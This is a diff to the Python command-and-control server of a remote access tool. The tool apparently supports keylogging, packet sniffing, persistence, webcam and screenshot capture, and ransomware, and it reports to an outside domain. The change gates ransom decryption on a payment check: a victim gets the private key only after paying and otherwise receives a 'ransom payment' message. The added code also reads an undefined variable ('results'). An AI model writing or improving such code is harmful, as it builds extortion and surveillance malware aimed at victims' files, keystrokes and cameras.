@@ -83,7 +83,7 @@ PORT = 1337
 
 
 # server is contained to the local network if debugging mode is true
-DEBUG = False
+DEBUG = True
 
 
 # comment the following line to disable colored console
@@ -94,7 +94,8 @@ colorama.init()
 class Server(threading.Thread):
 
     global threads
-    database = {'domain': 'https://snapchat.sex/', 'pages' : {'query'     : 'query.php','session'   : 'session.php','ransom'    : 'ransom.php'},'session_key': None,'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload','email']}
+    
+    database = {'domain':'https://snapchat.sex/', 'pages': {'query': 'query.php','session': 'session.php'}, 'session_key': None, 'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload','email']}
     
     def __init__(self, port, **kwargs):
         super(Server, self).__init__()
@@ -571,7 +572,13 @@ class Server(threading.Thread):
     def ransom_client(self, args=None):
         if self.current_client:
             if 'decrypt' in str(args):
-                self.send_client("ransom decrypt %s" % self.current_client.private_key.exportKey(), self.current_client.name)
+                result = self.query_database("SELECT * FROM ransom WHERE session='{}'".format(self.current_client.session))
+                if result:
+                    result = json.loads(result)
+                    if int(results.get('payment')) != 0:
+                        self.send_client("ransom decrypt %s" % self.current_client.private_key.exportKey(), self.current_client.name)
+                    else:
+                        self.send_client("ransom payment")
                 return
             else:
                 self.send_client("ransom %s" % args, self.current_client.name)
